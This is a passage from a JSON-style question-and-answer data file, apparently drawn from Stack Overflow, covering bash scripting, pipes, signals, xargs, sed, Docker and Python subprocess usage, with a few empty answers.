__GNUC_MINOR__);}' | gcc -o \"$$a\" -xc -; \"$$a\"; rm \"$$a\")\nexport\ndefault:\n    set\nSince your system doesn't work the same as mine, I'm going to cop out and say either use reinierpost's suggestion or, alternatively:\nGCCVER := $(shell gcc -dumpversion | cut -d. -f1,2)",
    "How to update an executed script import in the Python shell after editing it?": "Inside of iPython or the standard Python interpreter, you can use the reload() function to reload an imported module.\nExample:\nIn [1]: import foo\n  # make some changes to the foo.py\nIn [2]: reload(foo)",
    "How to call a shell script from PLSQL program": "You have a couple of options available:\nInvoke a Java method from within a PL/SQL wrapper.\nCall a C program as an external procedure from within PL/SQL.\nUse the new DBMS_SCHEDULER package.\nHere's a link with INFO on them.",
    "How can I (from a script) add something to the zsh command history?": "You can use the print -s command (see man zshbuiltins) to add anything you want to the history. There's also a hook function you can create called zshaddhistory (see man zshmisc) that can manipulate history contents as they are created.\nSee my Bash history logging functions for inspiration.",
    "How to run a python script without specifying the file extension (cross platform solution)?": "On windows i added the '.py' extension to the 'PATHEXT' environment variable and that works for me - if the .py file is stored in an directory that is part of the 'PATH' environment variable.\nC:\\>echo %PATHEXT%\n.COM;.EXE;.BAT;.CMD;.PY;.JS;.JSE",
    "wait until docker start in Mac OS through shell script?": "Here's what I use. It's a modification of jeffbymes' answer. Instead printing the error messages and waiting for 10 seconds between retries, this just prints a nice message with an ellipsis that grows one dot every second until Docker is ready.\n#!/bin/bash\n\nprintf \"Starting Docker for Mac\";\n\nopen -a Docker;\n\nwhile [[ -z \"$(! docker stats --no-stream 2> /dev/null)\" ]];\n  do printf \".\";\n  sleep 1\ndone\n\necho \"\";",
    "\u2018ls\u2019 terminated by signal 13 when using find command [duplicate]": "It is nothing to worry about. It is a broken pipe because head will finish reading the first 10 lines before all of the lines are written to stdout.\nYou can silence it with >/dev/null 2>&1 on the end or 2>/dev/null to just silence the errors. I've also seen another trick where you add tail -n +1 into the pipeline:\nfind $exceeds_thresh -xdev -size +5M -exec ls -lah {} \\; | tail -n +1 | head -n 10\nThis is going to cost you some time, but it will work without changing the outcome.",
    "Is \"xargs\" on MacOS not the same as linux?": "The equivalent is simply docker ps -a -q | xargs docker kill.\n-r (aka. --no-run-if-empty) is only necessary on GNU xargs because it will always run the command at least once by default, even if there is no input; -r disables this. BSD xargs does not have this behavior, so there's no need to disable it.",
    "Custom git command autocompletion": "Figured it out. I needed to download git bash completion (here), create a new file in /etc/bash_completion.d with the following contents:\nsource ~/.git-completion.bash\n_git_install ()\n{\n  __gitcomp_nl \"$(__git_refs)\"\n}\nand then exec bash to reload completion scripts.",
    "PHP running multiple scripts concurrently": "",
    "How to detect if system has IPv6 enabled in a UNIX shell script?": "This can be tested by checking the existance of /proc/net/if_inet6 as follows:\ntest -f /proc/net/if_inet6 && echo \"IPv6 supported\" || echo \"IPv6 not supported\"\nI've tested it on Ubuntu, Mint, Raspberry PI and Bash shell in Windows, and it works in all these environments.",
    "BASH - getting UID on shell script does not work [duplicate]": "$UID is a Bash variable that is not set under sh, that may be why it outputs blank lines.\nTry bash test.sh or make your script executable with chmod u+x test.sh, the program defined in shebang will then be used (/bin/bash)",
    "Get path from OS X file reference URL alias (file:///.file/id=...)": "In Swift you can use URL.standardized to get the valid path from a reference URL. So in Swift 4 - to get the file name from a drag-and-dropped file you'd do something like...\nlet fileType = NSPasteboard.PasteboardType (kUTTypeFileURL as String)\n\nextension NSPasteboardItem {\n    func fileURL ()->URL? {\n        if let refURL = self.string(forType: fileType) {\n            return URL (fileURLWithPath: refURL).standardized\n        }\n        return nil\n    }\n}",
    "What is @(...|...|...) syntax in bash?": "Search for the extglob option in man bash:\nIf the extglob shell option is enabled using the shopt builtin, several extended pattern matching operators are recognized. In the following description, a pattern-list is a list of one or more patterns separated by a |. Composite patterns may be formed using one or more of the following sub-patterns:\n?(pattern-list)\n    Matches zero or one occurrence of the given patterns\n*(pattern-list)\n    Matches zero or more occurrences of the given patterns\n+(pattern-list)\n    Matches one or more occurrences of the given patterns\n@(pattern-list)\n    Matches one of the given patterns\n!(pattern-list)\n    Matches anything except one of the given patterns",
    "How to interactively expand a bang command in bash?": "There are a few options you can use for history expansion. One is the :p modifier, which prints the expanded command instead of executing it.\n$ echo foo\n$ !!:p\necho foo\nAnother is to use the histverify option, which puts the result of history expansion in the shell buffer for editing instead of immediately executing it.\n$ shopt -s histverify\n$ echo foo\nfoo\n$ !!\n$ echo foo\nIf you're happy with the command, simply hit Enter again to execute it, as if you had just typed it.\nBy default, the Readline command history-expand-line is bound to M-^ (Alt-^ or Esc-^, depending on what your terminal emulator sends as the meta key), which expands any history expansions on the current command line.\nThere is also a general Readline command shell-expand-line (bound to M-C-e by default), which expands everything on the command line, just as the shell would after hitting Enter but just before actually executing it.",
    "Check if Bash script is compatible with sh": "Being sh-compatible isn't, in itself, a goal. What issue(s) are you running into that requires your script work with sh? Depending on your reasoning different options may or may not be sufficient. If you simply need your script to run on most modern environments then using bash should be perfectly fine, and may actually be better than using sh, since sh maps to different shells on different platforms. On most modern environments it isn't actually its own binary but is just bash in POSIX-compliant mode, or another shell like dash.\nIf you really just need to make an existing Bash script work with the shebang #!/bin/sh you have several options:\nJust run it as sh your_script.sh and see what happens - Bash is a superset of sh syntax, so many simple Bash scripts are valid sh scripts.\nRun sh -n your_script.sh as rojomoke suggests, which will report syntax errors without actually executing the script (but may not catch all issues).\nManually audit your script for invalid syntax (John B's Bashisms reference isn't a bad start), this obviously isn't a great solution but in practice it's the only way to be sure. If that seems daunting, well, it is :)\nIf you want/need to support sh the best option is simply to specify your script's shebang as #!/bin/sh - if it behaves as desired in the environments you need it to then it's (by definition) sh-compatible.\nNote that you can write a sh-compatible script that still isn't POSIX-compliant, since many standard utilities like grep have their own POSIX-compliant feature sets you'd need to respect too. Again though, being POSIX-compliant isn't an end in itself, and I'd encourage you to confirm you really need to support POSIX before trying to be compliant with the standard.\nI asked a related question you might find helpful too.",
    "Why does `ls | cat` != `ls`?": "The ls command checks the file type of its standard output. If it detects a \u201ctty\u201d, it emits multicolumn output. If it detects any other file type (like a disk file or a pipe), it emits single column output.\nTty is short for teletype. In the old days, you would use an actual teletype to interact with a Unix system. So if standard output was a teletype, ls would produce output optimized for humans. Otherwise, it would produce output optimized for programs.\nWith the advent of other ways to run an interactive shell, like telnet sessions and window systems, the Unix authors created the pseudo-teletype, or \u201cpty\u201d, a software-only \u201cdevice\u201d which pretends to be a teletype. One program (like the telnet server, the ssh server, or the terminal window) can use a pty to make another program (the shell) think it is talking to a teletype.\nYou can use the -C flag to force ls to emit multicolumn output. You can use the -1 (digit one) flag to force single column output.",
    "How can I get the created/modified date of a file in Shell Scripting?": "Use stat:\nstat -c %w filename\nNote that the date shown in your ls example is not the create date but the last modified date, which you'd get with stat formatter %y instead:\nstat -c %y filename",
    "Download files using Shell script": "wget http://example.com/directory/file{1..200}.txt\nshould do it. That expands to wget http://example.com/directory/file1.txt http://example.com/directory/file2.txt ....\nAlternatively, your current code should work fine if you remove the call to exec, which is unnecessary and doesn't do what you seem to think it does.",
    "How to run commands which require sudo using Capistrano V3?": "From this page, it looks like the suggested way to use sudo with capistrano 3 is to set up passwordless sudo.",
    "Bad array subscript": "So on line 38,\nif (( times[$i] > times[$i - 1] + $SECS + 10 ))\nwould refer to times[-1] once during the iteration. Negative indices are only very recently part of bash arrays, so that is most likely why you are getting the error.\nLikewise with lines 54 and 67 you're hitting a negative array subscript once. Adjust your loops to avoid [0 - 1].",
    "How do I know if a bash script is running with nohup?": "Checking for file redirections is not robust, since nohup can be (and often is) used in scripts where stdin, stdout and/or stderr are already explicitly redirected.\nAside from these redirections, the only thing nohup does is ignore the SIGHUP signal (thanks to Blrfl for the link.)\nSo, really what we're asking for is a way to detect if SIGHUP is being ignored. In linux, the signal ignore mask is exposed in /proc/$PID/status, in the least-significant bit of the SigIgn hex string.\nProvided we know the pid of the bash script we want to check, we can use egrep. Here I see if the current shell is ignoring SIGHUP (i.e. is \"nohuppy\"):\n$ egrep -q \"SigIgn:\\s.{15}[13579bdf]\" /proc/$$/status && echo nohuppy || echo normal\nnormal\n$ nohup bash -c 'egrep -q \"SigIgn:\\s.{15}[13579bdf]\" /proc/$$/status && echo nohuppy || echo normal'; cat nohup.out\nnohup: ignoring input and appending output to `nohup.out'\nnohuppy",
    "Linux getenv() could not get $PS1 or $PS2": "The PS1 and PS2 shell variables are not exported and are therefore inaccessible from child processes. You can test this with a simple script:\n$ cat /tmp/pstest.sh\n#!/bin/sh\n\necho PS1=$PS1\necho PS2=$PS2\n\n\n$ /tmp/pstest.sh \nPS1=\nPS2=",
    "Removing special characters(<200c> <200d> from a text file": "I think that the only thing you're missing is how to enter special characters in your search patterns in vim. That would be with: ^Vu200c and ^Vu200d\nFor more information, please have a look here.",
    "Delphi add menu item in Windows Explorer right click": "The simplest way to do this is to add a registry entry like this:\nHKEY_CLASSES_ROOT\n  *\n    shell\n      YourAppName\n        Command      C:\\Full\\Path\\To\\Your\\App.exe \"%1\"\nWhen the user clicks on this menu item your app will be executed and passed the file name as the first command line argument.\nWhilst you can write a shell extension for this, that is more difficult. What's more, if you are using Delphi 7 then you will not be able to write a shell extension for 64 bit Windows.",
    "How to line up columns using paste(1)? or how to make an aligned table merging lines in the shell?": "Check out the column utility...\n$ echo -e \"a\\nb\\ncccccccccccc\\nd\" | paste - - | column -t\na             b\ncccccccccccc  d",
    "Bash place cursor beginning of line": "While Deanie's answer of\necho -ne \"\\r\"\nis correct, I found I had to ensure that my hash bang was correct:\n#!/bin/bash\nNOT\n#!/bin/sh",
    "What is the difference between shell options -v and -x for debugging?": "From the manual:\n  -v  Print shell input lines as they are read.\n  -x  Print commands and their arguments as they are executed.\nYou can see this distinction when looking at how piped commands are handled:\n$ set -v\n$ echo \"Hello World\" | sed 's/World/Earth/'\necho \"Hello World\" | sed 's/World/Earth/'\nHello Earth\nversus:\n$ set -x\n$ echo \"Hello World\" | sed 's/World/Earth/'\n    + sed s/World/Earth/\n    + echo 'Hello World'\n    Hello Earth\nAlso, it appears that xtrace (-x) uses the $PS4 variable, while verbose (-v) does not.",
    "Bash script size limitation?": "Yes, this is a limitation with bash.\nIt's not a script size limit; rather it's a limit to the depth of the parser stack, which has the effect of restricting the complexity of certain constructs. In particular, it will restrict the number of elif clauses in an if statement to about 2500.\nThere is a longer analysis of this problem with respect to a different syntactic construct (iterated pipes) in my answer to a question on the Unix & Linux stackexchange site.\ncase statements don't have this limitation, and the sample you provide certainly looks like a good match for a case statement.\n(The difference with case statements is that the grammar for if conditional statements, like that of pipe constructs, is right recursive, while the grammar for case statements is left recursive. The reason the limitation on if statements is different from the limitation on pipes is that the grammatical construct for an elif clause has one more symbol, so each repetition uses four stack slots rather than three.)\nIf the case statement doesn't work for you -- or even if it does -- you could try building a precompiled binary search tree of if statements:\nif (( task_number < 8 )); then\n  if (( task_number < 4 )); then\n    if (( task_number < 2 )); then\n      if (( task_number < 1)); then\n        # do task 0\n      else\n        # do task 1\n      fi;\n    elif (( task_number < 3 )); then\n      # do task 2\n    else\n      # do task 3\n    fi\n  elif (( task_number < 6 )); then\n    if (( task_number < 5 )); then\n      # do task 4\n    else\n      # do task 5\n    fi\n  elif (( task_number < 7 )); then\n    # do task 6\n  else\n    # do task 7\n  fi\nelif (( task_number < 12 )); then\n  if (( task_number < 10 )); then\n    if (( task_number < 9 )); then\n      # do task 8\n    else\n      # do task 9\n    fi\n  elif (( task_number < 11 )); then\n    # do task 10\n  else\n    # do task 11\n  fi\nelif (( task_number < 14 )); then\n  if (( task_number < 13 )); then\n    # do task 12\n  else\n    # do task 13\n  fi\nelif (( task_number < 15 )); then\n  # do task 14\nelse\n  # do task 15\nfi\nBecause each complete if statement only occupies a single stack node after it is recognized, the complexity limitation will be on the nesting depth of the if statements rather than the number of clauses. As an additional bonus, it will execute a lot fewer comparisons in the average case.\nIf you have no alternative other than a sequential list of conditions, you can use separate if statements:\nwhile :; do\n  if condition1; then\n    # do something\n  break; fi; if condition2; then\n    # do something\n  break; fi; if condition3; then\n    # do something\n  break; fi; if condition4; then\n    # do something\n  break; fi\n  # No alternative succeeded\n  break\ndone\nThe unconventional indent is intended to illustrate the simple program transformation: simply replace every elif with break;fi;if and surround the whole thing with a while (to provide the target for the breaks.)",
    "Bash executing multiple commands in background in same line": "As per the bash manpage:\nA list is a sequence of one or more pipelines separated by one of the operators ;, &, &&, or ||, and optionally terminated by one of ;, &, or <newline>.\nIf a command is terminated by the control operator &, the shell executes the command in the background in a subshell. The shell does not wait for the command to finish, and the return status is 0. Commands separated by a ; are executed sequentially; the shell waits for each command to terminate in turn. The return status is the exit status of the last command executed.\nYou can see there that & isn't just something that runs a command in the background, it's actually a separator as well. Hence, you don't need the semicolon following it. In fact, it's actually invalid to try that, just the same as if you put two semicolons in sequence, the actual problem being that bash does not permit empty commands:\npax> echo 1 ; echo 2\n1\n2\n\npax> echo 1 ; ; echo 2\nbash: syntax error near unexpected token ';'\nYou can see how this works from the following transcript, where the second and third dates are not separated because the sleep 10 runs in the background:\npax> date ; sleep 5 ; date ; sleep 10 & date ; wait\nThursday 5 April  09:04:07 AWST 2018\nThursday 5 April  09:04:12 AWST 2018\n[1] 28999\nThursday 5 April  09:04:12 AWST 2018\n[1]+  Done                    sleep 10",
    "Understanding python subprocess.check_output's first argument and shell=True [duplicate]": "From the documentation of Popen:\nThe shell argument (which defaults to False) specifies whether to use the shell as the program to execute. If shell is True, it is recommended to pass args as a string rather than as a sequence.\nOn Unix with shell=True, the shell defaults to /bin/sh. If args is a string, the string specifies the command to execute through the shell. This means that the string must be formatted exactly as it would be when typed at the shell prompt. This includes, for example, quoting or backslash escaping filenames with spaces in them. If args is a sequence, the first item specifies the command string, and any additional items will be treated as additional arguments to the shell itself. That is to say, Popen does the equivalent of:\nPopen(['/bin/sh', '-c', args[0], args[1], ...])\nOn Windows with shell=True, the COMSPEC environment variable specifies the default shell. The only time you need to specify shell=True on Windows is when the command you wish to execute is built into the shell (e.g. dir or copy). You do not need shell=True to run a batch file or console-based executable.\nIn your case, since echo is a shell built-in when launched with shell=True, if you want to pass arguments to the echo command you must either write the command as a string or pass a sequence that has the whole command as a string as first element. Other elements of the sequence are passed as arguments to the shell, not to the command you are invoking.\nIn some OSes echo is also a program (usually /bin/echo). This explains why your first example didn't raise an exception but outputs '\\n' instead of the expected 'Hello, World!\\n': the /bin/echo command was executed without arguments, because the argument was \"consumed\" by the shell.\nThe error raised when calling:\nsubprocess.check_output(\"echo Hello World!\")\nis due to the fact that, since you did not use shell=True, python is trying to execute the program echo Hello World! i.e. a program that has the name echo<space>Hello<space>World!. It is a valid program name, but you there's no program with that name, hence the exception.",
    "halt and poweroff [closed]": "Halt does just what it says: it stops the machine, leaving it in a powered-on state (which usually implies that someone has to reboot or shut it down manually afterwards). Like halt, poweroff also stops the machine, but also shut it down afterwards.\nThe fact that on your physical machine the halt command also shuts the machine down, might just be a tweak of your linux distribution (the proper halt behavior probably doesn't make much sense for everyday use).\nCheck\nman halt\nfor details.\nAs for the CPU usage of your virtual machine after a halt, my half-educated guess is that since the operating system is not running on it anymore, no HLT instruction can be issued and therefore your console meter shows a 100% CPU usage (maybe your virtual machine control panel computes the CPU occupancy by checking how many HLT instructions are executed per second):\nhttp://en.wikipedia.org/wiki/Idle_(CPU)",
    "Duplicate stdout, pipe it to two different commands, collect results from both to stdin of final program": "I have not tested this, but try:\n{ generator | tee /dev/stderr | processor ; } 2>&1  | verifier\nThis will redirect a copy of generator output to stderr. Then run processor on stdout of generator. Then combine both & pipe to verifier.\nHowever, this cannot guarantee the order, in which lines from generator & processor would reach verifier.\nAlternately, you can try process substitution like below:\n( generator | tee >(processor) ) | verifier",
    "Partial directory list in linux": "One option is to pipe the output to less or more\nls | less\nor\nls | more",
    "What are the rules of string manipulation when using backticks (grave accents)?": "",
    "How to create an AppleScript- or Command-file to launch a Java application on Mac OS?": "Okay, after some hours of research it seems there are more than just one answer to this issue(s).\nBash scripts\nThe simplest way to create scripts in Mac OS seems to be the .command bash script files. They look quite similar to linux shell scripts. Make them executable like shell scripts with chmod +x.\nMultiple issues\nOne reason for the NoClassDefFoundError can be that the default installed Java VM on Mac OS is lower than the needed JRE/JDK which was used compiling the software. Nothing more I can do about that than just telling the user to install the lateste JRE.\nAnother reason for the NoClassDefFoundError is - and this is quite shocking - that bash scripts in Mac OS don't run from within the same directory as where they are located in but from the user's home directory. The solution is to add a line to the bash script to find out the working directory: cd \"$(dirname \"$0\")\" (See also.)\nSummary\nWindows: launch-win32.bat\n@echo off\njavaw -Xss1024k -Xmn256m -Xms512m -Xmx1024m -cp lib/*;bin/myjar-latest.jar my.package.MyMainClass\nLinux: launch-linux.sh\n#!/bin/sh\njava -Xss1024k -Xmn256m -Xms512m -Xmx1024m -cp lib/*:bin/myjar-latest.jar my.package.MyMainClass\nMac OS: launch-macos.command\n#!/bin/bash\ncd \"$(dirname \"$0\")\"\njava -Xss1024k -Xmn256m -Xms512m -Xmx1024m -cp lib/*:bin/myjar-latest.jar my.package.MyMainClass",
    "nested shell variables without using eval": "You can use associative arrays, joining the value of both variables. For example:\ndeclare -A databases\n# initialization\ndatabases[\"es:sales\"]=\"blahblah/es/sales.csv\"\ndatabases[\"en:support\"]=\"yadayada/en/support.csv\"\nThen, you can get the database just by:\necho ${databases[\"${country}:${action}\"]}\nThis has the advantage of having the database names collected by only one variable.",
    "How to grep lines that start with double forward slash in Linux command line?": "Use regular expressions:\ngrep -E '^ *//'",
    "WGET: Removing 'filename' since it should be rejected": "It's because the accept list is being checked twice, once before downloading and once after saving. The latter is the behavior you see here (\"it's not a bug, it's a feature\"):\nYour saved file yl-120058.wmv does not match your specified pattern -A \"high.wmv\" and will be thus rejected and deleted.\nQuote from wget manual:\nFinally, it's worth noting that the accept/reject lists are matched twice against downloaded files: [..] the local file's name is also checked against the accept/reject lists to see if it should be removed. [..] However, this can lead to unexpected results.",
    "How to reverse sed output?": "Try using back references:\nsed 's/.*\\(searchstring\\).*/___\\1___/'\nThe .*'s around the search string will match everything but the string, and the parentheses tell sed to remember what it matched. You can refer to the first matched string with \\1.\nHere's an example (replacing everything but 'bar baz'):\n$ echo \"foo bar baz qux\" | sed 's/.*\\(bar baz\\).*/___\\1___/'\n___bar baz___\nYou can replace 'bar baz' with whatever pattern you like in the above; I just used a basic string for simplicity.",
    "How do I programmatically send an email in the same way that I can \"Send To Mail Recipient\" in Windows Explorer?": "This is my MAPI solution:\n#include <tchar.h>\n#include <windows.h>\n#include <mapi.h>\n#include <mapix.h>\n\nint _tmain( int argc, wchar_t *argv[] )\n{\n    HMODULE hMapiModule = LoadLibrary( _T( \"mapi32.dll\" ) );\n\n    if ( hMapiModule != NULL )\n    {\n        LPMAPIINITIALIZE lpfnMAPIInitialize = NULL;\n        LPMAPIUNINITIALIZE lpfnMAPIUninitialize = NULL;\n        LPMAPILOGONEX lpfnMAPILogonEx = NULL;\n        LPMAPISENDDOCUMENTS lpfnMAPISendDocuments = NULL;\n        LPMAPISESSION lplhSession = NULL;\n\n        lpfnMAPIInitialize = (LPMAPIINITIALIZE)GetProcAddress( hMapiModule, \"MAPIInitialize\" );\n        lpfnMAPIUninitialize = (LPMAPIUNINITIALIZE)GetProcAddress( hMapiModule, \"MAPIUninitialize\" );\n        lpfnMAPILogonEx = (LPMAPILOGONEX)GetProcAddress( hMapiModule, \"MAPILogonEx\" );\n        lpfnMAPISendDocuments = (LPMAPISENDDOCUMENTS)GetProcAddress( hMapiModule, \"MAPISendDocuments\" );\n\n        if ( lpfnMAPIInitialize && lpfnMAPIUninitialize && lpfnMAPILogonEx && lpfnMAPISendDocuments )\n        {\n            HRESULT hr = (*lpfnMAPIInitialize)( NULL );\n\n            if ( SUCCEEDED( hr ) )\n            {\n                hr = (*lpfnMAPILogonEx)( 0, NULL, NULL, MAPI_EXTENDED | MAPI_USE_DEFAULT, &lplhSession );\n\n                if ( SUCCEEDED( hr ) )\n                {\n                    // this opens the email client with \"C:\\attachment.txt\" as an attachment\n                    hr = (*lpfnMAPISendDocuments)( 0, \";\", \"C:\\\\attachment.txt\", NULL, NULL );\n\n                    if ( SUCCEEDED( hr ) )\n                    {\n                        hr = lplhSession->Logoff( 0, 0, 0 );\n                        hr = lplhSession->Release();\n                        lplhSession = NULL;\n                    }\n                }\n            }\n\n            (*lpfnMAPIUninitialize)();\n        }\n\n        FreeLibrary( hMapiModule );\n    }\n\n    return 0;\n}",
    "set -e and background process": "Starting a command asychronously (with &) always returns exit status 0. To get the actual exit status of the command use the builtin wait. A simple example:\n$ (sleep 5; ls -l nofile) &\n[1] 3831\n$ echo $?\n0\n$ wait -n\nls: cannot access 'nofile': No such file or directory\n[1]+  Exit 2                  ( sleep 5; ls --color=auto -l nofile )\n$ echo $?\n2\nwait -n waits for any child process (which can be very useful). If you want to wait for a specific process, you can capture the PID when you start it -- it's in the special variable $! -- then wait by PID:\n$ (sleep 5; ls -l nofile) &\n$ myjobpid=$!\n$ # do some other stuff in parallel\n$ wait ${myjobpid}\nls: cannot access 'nofile': No such file or directory\n[1]+  Exit 2                  ( sleep 5; ls --color=auto -l nofile )\nThe relevant section of the Bash manual is titled \"Job control\"",
    "How to create a map of key:array in shell?": "Bash does not support multi-dimensional arrays, but I don't think you need one. You can store a string in the form of a list in an array element, which will give you what you ask for.\n# My made-up version of getServices\ngetServices() {\n    nm=\"$1\"\n    last=${nm##*Type}\n    retn=(${last}1 ${last}2 ${last}3 ${last}4)\n    echo \"${retn[@]}\"\n}\n\n\ndeclare -A serviceList\nlistService(){\n    serviceType=\"$1\"\n\n    # Here I use the key to make an assignment, which adds to the hash\n    serviceList[\"$serviceType\"]=$(getServices $serviceType) \n}\n\nlistService serviceTypeA\nlistService serviceTypeB\nlistService serviceTypeC\n\nfor key in ${!serviceList[@]}\ndo\n    echo \"\\\"$key\\\": ${serviceList[$key]}\"\ndone\nGives:\n\"serviceTypeC\": C1 C2 C3 C4\n\"serviceTypeB\": B1 B2 B3 B4\n\"serviceTypeA\": A1 A2 A3 A4\nEDIT for new question:\nalter:\narrayMap[\"$param\"]=$values     # THIS IS THE KEY LINE\nvaluesList=${arrayMap[$param]} \nto:\narrayMap[\"$param\"]=${values[@]} \nvaluesList=( ${arrayMap[$param]}  )  \nWhen you refer to an array variable by just it's name ($values) you only get the first element.",
    "Windows batch equivalent to bash 'set -x'": "Put \"@echo on\" at the beginning of your script\nAt-sign at the beginning of the line suppress echo of this first line",
    "Get exit status code from Python, e.g. 0 or 1": "Since as per your answer you are using zsh\ntest.py\nimport sys\nsys.exit(12)\nin your console\npython test.py\nRC=$?\necho \"Exit code $RC\"\nprogram_to_send $RC",
    "Why do file permissions show different in Python and bash?": "This is because your /etc/termcap is a symlink. Let me demonstrate this to you:\nBash:\n$ touch bar\n$ ln -s bar foo\n$ stat -f \"%p %N\" foo\n120755 foo\n$ stat -f \"%p %N\" bar\n100644 bar\nPython:\n>>> import os\n>>> oct(os.stat('foo').st_mode)\n'0100644'\n>>> oct(os.stat('bar').st_mode)\n'0100644'\n>>> oct(os.lstat('foo').st_mode)\n'0120755'\n>>> oct(os.lstat('bar').st_mode)\n'0100644'\nConclusion, use os.lstat instead of os.stat",
    "Ignore HUP signal in Bash script with pipe commands": "Pipeline commands are run in a subshell\nThe first part of your question is explained by the mechanism through which a shell (in this case Bash) runs commands in a pipeline.\nA pipe is a FIFO (first in, first out) one-way inter-process communication (IPC) channel: it allows bytes to be written at one end (the write-only end) and read from the other (read-only end) without needing to read from or write to a physical filesystem.\nA pipeline allows two different commands to communicate with each other through an anonymous or unnamed (i.e., has no entry in the filesystem) pipe.\nWhen a simple command is executed by a shell, the command is run in a child process of the shell. If no job control is used, control of the terminal is regained by the shell when the child process terminates.\nWhen two commands are run in a pipeline, both commands in the pipeline are executed as two separate child processes which run concurrently.\nIn Unix systems, pipes are created using the pipe(2) system call, which creates a new pipe and returns a pair of file descriptors with one referring to the read end and the other to the write end of the pipe.\nWith Bash on a GNU/Linux system, the clone(2) system call is used to create the sub-processes. This allows the child process to share the table of file descriptors with its parent process so that both child sub-processes inherit the file descriptor of the anonymous pipe so that one can read to it and the other can write to it.\nIn your case, the inotifywait command gets a PID of 4425 and writes to the write-only end of the pipe by connecting its stdout to the file descriptor of the write end.\nAt the same time, the right hand side of the pipe command gets the PID, 4426 and its stdin file descriptor is set to that of the read-only end of the pipe. Since the subshell for the right hand side of the pipe isn\u2019t an external command, the name to represent the child process is the same as that of its parent, test.sh.\nFor more info, see man 7 pipe and the following links:\nAnonymous pipe, Wikipedia article\nUnix Pipeline, Wikipedia article\nSignal handling\nIt took me ages (a couple of hours of research, in fact) to figure out why the trap for the SIGHUP signal wasn\u2019t being ignored.\nAll my research indicated that child process created by a clone(2) system call should also be able to share the table of signal handlers of the parent process.\nThe Bash man page also states that\nCommand substitution, commands grouped with parentheses, and asynchronous commands are invoked in a subshell environment that is a duplicate of the shell environment, except that traps caught by the shell are reset to the values that the shell inherited from its parent at invocation.\nIt later states that\nSignals ignored upon entry to the shell cannot be trapped or reset. Trapped signals that are not being ignored are reset to their original values in a subshell or subshell environment when one is created.\nThis indicates that subshells do not inherit signal handlers that are not ignored. As I understood it, your trap ':' HUP line meant that the SIGHUP signal was (effectively) being ignored (since the : builtin does nothing except return success) \u2013 and should in turn be ignored by the pipeline\u2019s subshell.\nHowever, I eventually came across the description of the trap builtin in the Bash man page which defines what Bash means by ignore:\nIf arg is the null string the signal specified by each sigspec is ignored by the shell and by the commands it invokes.\nSimply changing the trap command to trap '' HUP ensures that the SIGHUP signal is ignored, for the script itself \u2013 and any subshells.",
    "How can I pass optional parameters to another command within a bash script?": "If you literally want to copy all arguments given, but add one more:\n# this works in any POSIX shell\n./b.sh \"$@\" defaultArg\nAlternately, to explicitly pass firstArg and secondArg, but only if they exist (note that set-to-an-empty-value counts as \"existing\" here):\n# this works in any POSIX shell\n./b.sh ${firstArg+\"$firstArg\"} ${secondArg+\"$secondArg\"} defaultArg\nIf you want to treat set-to-an-empty-value as not existing:\n# this works in any POSIX shell\n./b.sh ${firstArg:+\"$firstArg\"} ${secondArg:+\"$secondArg\"} defaultArg\nAn alternate approach is to build up an array of arguments:\n# this requires bash or another shell with arrays and append syntax\n# be sure any script using this starts with #!/bin/bash\nb_args=( )\n[[ $firstArg ]] && b_args+=( \"$firstArg\" )\n[[ $secondArg ]] && b_args+=( \"$secondArg\" )\nb_args+=( \"default argument\" )\n./b.sh \"${b_args[@]}\"\nIf you want something with the same flexibility as the array method, but without the compatibility issues, define a function; within it, you can safely override \"$@\" without impacting the rest of the script:\nrunB() {\n  set --\n  [ -n \"$firstArg\" ]  && set -- \"$@\" \"$firstArg\"\n  [ -n \"$secondArg\" ] && set -- \"$@\" \"$secondArg\"\n  ./b.sh \"$@\" \"default argument\"\n}",
    "Docker Copying file from host to container": "UPDATE: Now docker cp command line command works both ways. See the docker cp documentation\nUsage\ndocker cp [OPTIONS] CONTAINER:SRC_PATH DEST_PATH|-\ndocker cp [OPTIONS] SRC_PATH|- CONTAINER:DEST_PATH\n=======Original Answer ==============\nFound the most easiest way that works across storage drivers:\ncd /proc/`docker inspect --format \"{{.State.Pid}}\" <containerid>`/root\nHave tested this on Fedora with Devicemapper as the storage driver and on Ubuntu with AUFS as the storage driver. Works for me in both the cases.",
    "Script Karaf shell commands?": "To issue Karaf shell commands not-interactively, preferably from a script you can also use the Karaf client (scroll down to \"Apache Karaf client\"). To install features I use command like\n/opt/karaf/bin/client -r 7 \"feature:install http; feature:install webconsole\"\nThe -r switch allows to retry the connection if the server is not up yet (I use it in a Docker script).",
    "Quit from pipe in bash": "You're correct. The while loop is executing in a subshell because its input is redirected, and exit just exits from that subshell.\nIf you're running bash 4.x, you may be able to achieve what you want with a coprocess.\ncoproc TAIL { tail -Fn0 /tmp/report.txt ;}\nwhile [ 1 ]\ndo\n    echo \"pre\"\n    break\n    echo \"past\"\ndone <&${TAIL[0]}\nkill $TAIL_PID\nhttp://www.gnu.org/software/bash/manual/html_node/Coprocesses.html\nWith older versions, you can use a background process writing to a named pipe:\npipe=/tmp/tail.$$\nmkfifo $pipe\ntail -Fn0 /tmp/report.txt >$pipe &\nTAIL_PID=$!\nwhile [ 1 ]\ndo\n    echo \"pre\"\n    break\n    echo \"past\"\ndone <$pipe\nkill $TAIL_PID\nrm $pipe",
    "Emacs: why shell-command \"git log\" works, but \"git shortlog\" doesn't?": "man git-shortlog\nIf no revisions are passed on the command line and either standard input is not a terminal or there is no current branch, git shortlog will output a summary of the log read from standard input, without reference to the current repository.\nYou must explicitly provide reference to work in your case,\nUse, git shortlog HEAD instead.",
    "How to insert elements with attributes to an XML file using XmlStarlet?": "Answers\n/xml/block/el[not(@name)]\nAs stated in an other answer:\nYou can't insert an element with an attribute directly but since every edit operation is performed in sequence, you can insert an element and then add an attribute.\nThe command\nxmlstarlet ed -a '/xml/block/el[@name=\"b\"]' \\\n              -t 'elem' -n 'el' -v 0 \\\n              -i '/xml/block/el[not(@name)]' \\\n              -t 'attr' -n 'name' -v 'c'",
